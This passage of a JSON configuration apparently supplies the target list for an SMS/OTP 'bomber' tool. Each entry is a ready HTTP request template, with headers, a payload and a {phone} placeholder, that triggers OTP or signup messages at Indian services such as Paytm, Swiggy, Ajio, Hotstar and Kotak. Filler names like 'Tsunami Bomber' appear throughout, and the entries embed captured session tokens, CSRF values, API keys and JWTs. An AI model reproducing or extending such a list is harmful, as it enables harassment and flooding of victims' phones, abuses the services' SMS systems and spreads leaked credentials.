        "Referer": "https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US"
      },
      "data": {
        "email": "",
        "mobile": "{phone}",
        "loginPassword": "Pura@1090",
        "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
        "redirectUri": "https://paytm.com/v1/api/authresponse",
        "clientId": "paytm-web-secure",
        "scope": "paytm",
        "state": "",
        "responseType": "code",
        "theme": "mp-html5",
        "dob_agreement": true
      },
      "phone_format": "raw"
    },
    {
      "name": "Ogonn",
      "method": "POST",
      "url": "https://ogonn.in/otp",
      "headers": {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "origin": "https://ogonn.in",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://ogonn.in/login",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "AakashDigital_1",
      "method": "POST",
      "url": "https://digital.aakash.ac.in/mkt-signup-otp-verify",
      "headers": {
        "accept": "*/*",
        "origin": "https://digital.aakash.ac.in",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://digital.aakash.ac.in/online-courses?utm_source=Google_Search&utm_medium=Paid&utm_content=Online_Classes_GS&utm_campaign=Srch_Generic_GS_Exact_2020_Rxm&utm_term=online%20study%20courses&gclid=EAIaIQobChMIvouozor76wIVMcEWBR1y6QeAEAAYASAAEgKbQPD_BwE",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "_raw": "&mobileval={phone}&otp=6230"
      },
      "phone_format": "raw"
    },
    {
      "name": "Swiggy",
      "method": "POST",
      "url": "https://www.swiggy.com/mapi/auth/signup",
      "headers": {
        "origin": "https://www.swiggy.com",
        "__fetch_req__": "true",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/json",
        "accept": "*/*",
        "referer": "https://www.swiggy.com/auth/register",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "name": "dbdbdbd",
        "email": "tsunami@gmail.com",
        "password": "sndndndbdj283jsbsbs",
        "referral_code": "",
        "mobile": "{phone}",
        "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"
      },
      "phone_format": "raw"
    },
    {
      "name": "Limeroad",
      "method": "POST",
      "url": "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=",
      "headers": {
        "origin": "https://www.limeroad.com",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "referer": "https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "_raw": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Cilory",
      "method": "POST",
      "url": "https://www.cilory.com/app/w/auth/soft",
      "headers": {
        "accept": "application/json",
        "origin": "https://www.cilory.com",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/json;charset=UTF-8",
        "referer": "https://www.cilory.com/authentication?back=%2Fmy-account",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "mobile": "{phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Ajio_1",
      "method": "POST",
      "url": "https://login.web.ajio.com/api/auth/accountCheck",
      "headers": {
        "accept": "application/json",
        "Origin": "https://www.ajio.com",
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/json",
        "Referer": "https://www.ajio.com/signup?referrer=/my-account/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US"
      },
      "data": {
        "emailId": "tsunami@gmail.com"
      },
      "phone_format": "raw"
    },
    {
      "name": "Ajio_2",
      "method": "POST",
      "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
      "headers": {
        "accept": "application/json",
        "Origin": "https://www.ajio.com",
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/json",
        "Referer": "https://www.ajio.com/signup?referrer=/my-account/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US"
      },
      "data": {
        "firstName": "Tsunami Bomber",
        "login": "tsunami@gmail.com",
        "password": "kd34646@3131nxnxn",
        "genderType": "",
        "mobileNumber": "{phone}",
        "requestType": "SENDOTP"
      },
      "phone_format": "raw"
    },
    {
      "name": "AakashDigital_2",
      "method": "POST",
      "url": "https://digital.aakash.ac.in/signup-otp-verify",
      "headers": {
        "accept": "*/*",
        "origin": "https://digital.aakash.ac.in",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://digital.aakash.ac.in/user/register",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "_raw": "&mobileval={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "BookMyShow_1",
      "method": "POST",
      "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
      "headers": {
        "accept": "application/json",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://in.bookmyshow.com",
        "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber=9519874704&email=&source=web",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "channel": "phone",
        "subChannel": "sms",
        "details": {
          "phone": "{phone}",
          "origin": "https://in.bookmyshow.com"
        }
      },
      "phone_format": "raw"
    },
    {
      "name": "BigBasket",
      "method": "POST",
      "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
      "headers": {
        "accept": "application/json",
        "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "x-channel": "BB-PWA",
        "content-type": "application/json",
        "origin": "https://www.bigbasket.com",
        "referer": "https://www.bigbasket.com/auth/login/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "identifier": "{phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "FloMattress",
      "method": "POST",
      "url": "https://cod.flomattress.com/api/otp",
      "headers": {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Save-Data": "on",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.flomattress.com",
        "Referer": "https://www.flomattress.com/account/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "number={phone}&store=hushbedding.myshopify.com"
      },
      "phone_format": "raw"
    },
    {
      "name": "Banggood",
      "method": "POST",
      "url": "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
      "headers": {
        "accept": "application/json",
        "x-requested-with": "XMLHttpRequest",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://m.banggood.in",
        "referer": "https://m.banggood.in/login.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "mobilePhone={phone}&countryPhoneCode=91&type=1&verifyCode=KmUu"
      },
      "phone_format": "raw"
    },
    {
      "name": "Lenskart_1",
      "method": "POST",
      "url": "https://api.lenskart.com/v2/customers/sendOtp",
      "headers": {
        "origin": "https://www.lenskart.com",
        "x-b3-traceid": "991600776345288",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/json;charset=UTF-8",
        "accept": "application/json, text/plain, */*",
        "cache-control": "no-cache, no-store",
        "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399",
        "x-api-client": "mobilesite",
        "referer": "https://www.lenskart.com/customer/account/login",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "telephone": "{phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "UrbanClap",
      "method": "POST",
      "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
      "headers": {
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "accept": "application/json, text/plain, */*",
        "cache-control": "no-cache",
        "x-device-os": "web",
        "x-version-name": "web_v4.137.2",
        "save-data": "on",
        "x-client-key": "f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6",
        "x-device-id": "ucuf1348-a14e179422-8c71-b87f-9eb1-edeca1376e-1600777338230",
        "x-version-code": "4.137.2",
        "origin": "https://www.urbancompany.com",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "country_id": "IND",
        "phone": {
          "isd_code": "+91",
          "phone_wo_isd": "{phone}"
        },
        "device_type": "customer"
      },
      "phone_format": "raw"
    },
    {
      "name": "Ajio_3",
      "method": "POST",
      "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
      "headers": {
        "accept": "application/json",
        "Origin": "https://www.ajio.com",
        "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
        "content-type": "application/json",
        "Referer": "https://www.ajio.com/signup",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.8,en;q=0.6"
      },
      "data": {
        "firstName": "Djdhdjsjsjsjsk",
        "login": "xjdjdosh@gmail.com",
        "password": "spider##1213",
        "genderType": "Female",
        "mobileNumber": "{phone}",
        "requestType": "SENDOTP"
      },
      "phone_format": "raw"
    },
    {
      "name": "Lenskart_2",
      "method": "POST",
      "url": "https://api.lenskart.com/v2/customers/sendOtp",
      "headers": {
        "origin": "https://www.lenskart.com",
        "x-b3-traceid": "991603826710278",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "accept": "application/json, text/plain, */*",
        "cache-control": "no-cache, no-store",
        "x-session-token": "59dc2d84-55e6-4fc7-be6d-958b458ccd1e",
        "x-api-client": "mobilesite",
        "referer": "https://www.lenskart.com/customer/account/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en-US;q=0.8,en;q=0.6"
      },
      "data": {
        "telephone": "{phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "SonyLIV_2",
      "method": "POST",
      "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
      "headers": {
        "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
        "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDM4Mjc0NTEsImV4cCI6MTYwNTEyMzQ1MSwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.Pxfpv3puWt_4sbltsDa2UsmgeeSp30KK2lePV15-_AQ1dQ4Q6Iq6W2fKEpXUaz4WnXEMxIHTu4u7RRYjkp4SgKzuRFD4rMYyWxPBqdz2Xdsqp3eCYjza_re4bbJigWoF0X-X9Tue5D1wBjxr_XWlk9apED8gmzewR3SQnHgnFSf-TRqvb8v9nLofBcCLTLKs11yHDmZv8WN9Hi4G_xXxoRN1IqjqW4kHbXvw8hHxzyQZPAgmP18FZkJk62vHTUOcIa1cAFXrRl9yInqUj3UDaPVIJ4tu7XQGuTjn21iqusgWkXKtKnoeHftWrxbd645JeeBQik1b8qESSYCI1xMzD01eEcmaxaSP5abuCEMBGHmGIVwpyskiSwkBT-cuZe216i07XxZuaeo29mXrkuizNXfhAgZ1GvLD22rYOHt-PaGA-bKy_wHZv6ILf6Wt9XwuuxzroRKd_IS2Nl3pNMRzTl1UJ02uCTWw8RIdLFykiH3lBXSv4OkHMVUVJJp6KSSQHuH8Ejw3Zjag_rL2XkZvU7T9dT1ddforRk92_nuE96NTaj_UM-gb920oYoGBIxD-CoR5EvqbWlN4WzFF-AaV4auYobW9y1c0i-LiZrPE7dkDyuWSBsk1R-fBpTQDV2OhmbvWYiquurrKFhY5HFZy6bZ-Xrw_58mkn7-Ek0LaAEQ",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "session_id": "1b3e01a7268d4aff933446f020e2f3ab-1603827494316",
        "x-via-device": "true",
        "app_version": "3.1.42.3",
        "origin": "https://www.sonyliv.com",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "mobileNumber": "{phone}",
        "channelPartnerID": "MSMIND",
        "country": "IN",
        "timestamp": "2020-10-27T19:39:13.355Z"
      },
      "phone_format": "raw"
    },
    {
      "name": "Voot_2",
      "method": "POST",
      "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.voot.com",
        "referer": "https://www.voot.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "type": "mobile",
        "mobile": "{phone}",
        "countryCode": "+91"
      },
      "phone_format": "with_plus91"
    },
    {
      "name": "Zee5",
      "method": "GET",
      "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
      "headers": {
        "accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "Origin": "https://www.zee5.com",
        "Referer": "https://www.zee5.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "AltBalaji_2",
      "method": "POST",
      "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU",
        "Content-Type": "application/json",
        "Origin": "https://www.altbalaji.com",
        "Referer": "https://www.altbalaji.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone_number": "{phone}",
        "country_code": "91",
        "platform": "web",
        "exp": 1603915826710
      },
      "phone_format": "raw"
    },
    {
      "name": "Hotstar_2",
      "method": "PUT",
      "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
      "headers": {
        "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ0MzQ5NDUsImlhdCI6MTYwMzgzMDE0NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiNDcuOS4xMjIuNDVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiZmFhODhmMDUtNzQzMi00MTAzLTk4ODYtN2JkOTM0ZjVjM2ExXCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwMzgzMDE0NTg4NH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ATU4GrG4KucvkynhrFdg28qJ9LRwsN5MoWHlirRQsqo",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "x-hs-platform": "PCTV",
        "x-country-code": "IN",
        "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
        "hotstarauth": "st=1603830144~exp=1603836144~acl=/um/v3/*~hmac=cc2a715c0f26045e44e271d198ae382468d8a7dcb08825623016d6dcea06072d",
        "x-hs-appversion": "6.93.0",
        "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
        "accept": "*/*",
        "origin": "https://www.hotstar.com",
        "referer": "https://www.hotstar.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone_number": "{phone}",
        "country_prefix": "91"
      },
      "phone_format": "raw"
    },
    {
      "name": "Dream11_2",
      "method": "POST",
      "url": "https://www.dream11.com/graphql/mutation/pwa/register",
      "headers": {
        "accept": "*/*",
        "device": "pwa",
        "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://www.dream11.com",
        "referer": "https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
        "variables": {
          "email": "tsunami@gmail.com",
          "mobileNumber": "{phone}",
          "password": "tsunami@123astronomia"
        }
      },
      "phone_format": "raw"
    },
    {
      "name": "Quikr",
      "method": "POST",
      "url": "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
      "headers": {
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "accept": "*/*",
        "origin": "https://www.quikr.com",
        "referer": "https://www.quikr.com/SignIn?redirect=https%3A%2F%2Fwww.quikr.com%2F",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "user={phone}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IYg0Dg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true"
      },
      "phone_format": "raw"
    },
    {
      "name": "Kotak_1",
      "method": "POST",
      "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
      "headers": {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.kotak.com",
        "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"
      },
      "phone_format": "raw"
    },
    {
      "name": "Kotak_2",
      "method": "POST",
      "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc",
      "headers": {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.kotak.com",
        "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/otp-mobile.action?SWNToken=1603857646468&flw=vkyc",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {},
      "phone_format": "raw"
    },
    {
      "name": "Cuemath_2",
      "method": "POST",
      "url": "https://www.cuemath.com/api/v4/parents/",
      "headers": {
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/JSON",
        "accept": "*/*",
        "origin": "https://www.cuemath.com",
        "referer": "https://www.cuemath.com/parent/signup/?",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "intl_mobile": {
          "phone": "{phone}"
        },
        "notify": ["notify_on_whatsapp"],
        "phone": "{phone}",
        "email": "tsunami@gmail.com",
        "full_name": "Tsunami Bomber",
        "timezone": "Asia/Calcutta",
        "notify_through": "notify_on_whatsapp",
        "form_fields": "full_name,email,intl_mobile"
      },
      "phone_format": "raw"
    },
    {
      "name": "RedBus_2",
      "method": "GET",
      "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "referer": "https://m.redbus.in/preregister",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "HappyEasyGo",
      "method": "GET",
      "url": "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}&verifycode=FDCA",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "x-device": "mobile",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "referer": "https://m.happyeasygo.com/register",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "MakeMyTrip",
      "method": "POST",
      "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
      "headers": {
        "deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
        "currency": "inr",
        "language": "eng",
        "authorization": "h4nhc9jcgpAGIjp",
        "visitor-id": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
        "region": "in",
        "accept": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"a3d2f892-af4d-40d1-808a-db6286b8fe1f\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"value\":null}",
        "vid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
        "tid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
        "origin": "https://www.makemytrip.com",
        "referer": "https://www.makemytrip.com/",
        "accept-encoding": "gzip, deflate, br",
